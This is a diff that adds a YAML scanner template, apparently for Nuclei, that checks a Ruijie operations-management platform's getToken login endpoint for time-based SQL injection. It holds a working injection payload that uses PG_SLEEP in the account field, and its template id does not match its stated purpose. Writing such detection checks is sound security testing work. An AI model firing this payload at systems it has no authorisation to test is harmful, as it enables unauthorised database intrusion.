@@ -1,0 +1,39 @@
+id: poc-yaml-crocus-service-do-anyfile-read
+
+info:
+  name: 锐捷 乐享智能运维管理平台 getToken SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template tests for an SQL injection vulnerability in the 锐捷 乐享智能运维管理平台 by exploiting the /auth-ui/v1/api/user/token/getToken endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /auth-ui/v1/api/user/token/getToken HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        account=admin');SELECT PG_SLEEP({{t1}})--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "密码或用户名输入错误"
+      - type: word
+        part: header
+        words:
+          - "RIIL_LOGIN_VERIFICATION_CODE="
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
